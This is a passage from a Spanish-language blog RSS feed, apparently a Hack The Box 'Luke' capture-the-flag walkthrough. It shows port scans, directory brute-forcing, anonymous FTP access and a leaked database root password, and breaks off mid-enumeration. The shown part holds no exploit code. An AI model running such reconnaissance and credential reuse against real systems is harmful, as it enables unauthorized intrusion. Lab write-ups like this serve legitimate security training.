&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/37292&#34;&gt;&lt;strong&gt;Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &amp;lsquo;overlayfs&amp;rsquo; Local Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/vulnos2/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/vulnos2/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Luke</title>
        <link>https://sckull.github.io/posts/luke/</link>
        <pubDate>Sat, 14 Sep 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 14 Sep 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/luke/</guid>
        <description>Luke es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Luke es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Luke&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;FreeBSD&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.137&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/564&#34;&gt;H4d3s&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP##&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y su servicio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.137 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0
Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-28 21:04:45 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 8000/tcp on 10.10.10.137                                  
Discovered open port 3000/tcp on 10.10.10.137
Discovered open port 80/tcp on 10.10.10.137                                    
Discovered open port 21/tcp on 10.10.10.137                                    
Discovered open port 22/tcp on 10.10.10.137

nmap -sV -p8000,3000,80,21,22 10.10.10.137 -o nmap.scan
Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-28 16:28 CDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.137
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.2s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3+ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ext.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
22/tcp   open  ssh?
80/tcp   open  http     Apache httpd 2.4.38 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;FreeBSD&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/7.3.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3000/tcp open  http     Node.js Express framework
8000/tcp open  http-alt
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5/28%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5CEDA82A%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;He
SF:lp,42,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nCo
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ntent-length:\x200\r\n\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSLSessionReq,42,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Ba
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:d\x20Request\r\nConnection:\x20close\r\nContent-length:\x200\r\n\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%
SF:r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;LDAPSearchReq,42,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20close\r\nContent-length:\x200\r\n\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SIPOptions,42,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-length:\x200\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:r\n\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 190.94 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Ingresamos al servicio de FTP con las credenciales tipicas de anonymous y encontramos un archivo, &lt;code&gt;for_Chihiro.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_155131.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;for_Chihiro.txt&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of                         
the actual website I&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;ve created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !                               

Derry
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_155304.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - Puerto 80&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_163852.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster---puerto-80&#34;&gt;GOBUSTER - Puerto 80&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137/ -np -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt                           
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : http://10.10.10.137/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : txt,php,html
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/05/28 17:39:33 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/cgi-bin/.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/config.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/management &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/member &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/vendor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/05/28 17:46:34 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;configphp&#34;&gt;/config.php&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_164600.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$dbHost = &amp;#39;localhost&amp;#39;; 
$dbUsername = &amp;#39;root&amp;#39;; 
$dbPassword = &amp;#39;Zk6heYCyv6ZE9Xcg&amp;#39;; 
$db = &amp;#34;login&amp;#34;; 
$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&amp;#34;Connect failed: %s\n&amp;#34;. $conn -&amp;gt; error); 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;management&#34;&gt;/management&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_192916.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;loginphp&#34;&gt;/login.php&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_164636.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;puerto-8000&#34;&gt;PUERTO 8000&lt;/h3&gt;
&lt;p&gt;En el puerto 8000 encontramos un panel de logeo para la plataforma &lt;code&gt;Ajenti&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_193056.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En este punto utilizamos la contraseña y usuario que encontramos en config.php en los diferentes paneles de logeo pero no tuvimos acceso en ninguno de ellos con las credenciales.&lt;/p&gt;
&lt;h4 id=&#34;gobuster---puerto-3000&#34;&gt;GOBUSTER - Puerto 3000&lt;/h4&gt;
&lt;p&gt;Solo encontramos directorios para solicitudes de nodejs o json.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137:3000/ -np -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt,js
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : http://10.10.10.137:3000/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : html,txt,js,php
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/05/28 17:58:23 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/login &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/users &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/05/28 18:05:20 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos un escaneo de directorios con DIRBUSTER y obtuvimos dos &amp;ldquo;directorios&amp;rdquo; más en &lt;strong&gt;/users&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/users
/users/Admin
/users/admin
/users/ADMiN
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al visitar &lt;strong&gt;/login&lt;/strong&gt; y &lt;strong&gt;/Login&lt;/strong&gt; nos muestra el siguiente mensaje:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;please auth&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al visitar /users:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
